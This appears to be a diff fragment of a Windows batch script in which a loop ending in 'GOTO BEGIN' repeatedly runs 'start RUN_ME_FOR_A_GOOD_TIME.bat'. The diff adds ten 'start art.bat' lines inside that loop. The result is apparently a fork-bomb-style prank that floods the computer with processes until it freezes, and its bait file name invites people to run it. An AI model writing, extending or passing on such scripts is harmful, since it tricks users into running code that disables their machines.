@@ -24,4 +24,14 @@ start RUN_ME_FOR_A_GOOD_TIME.bat
 start RUN_ME_FOR_A_GOOD_TIME.bat
 start RUN_ME_FOR_A_GOOD_TIME.bat
 start RUN_ME_FOR_A_GOOD_TIME.bat
+start art.bat
+start art.bat
+start art.bat
+start art.bat
+start art.bat
+start art.bat
+start art.bat
+start art.bat
+start art.bat
+start art.bat
 GOTO BEGIN
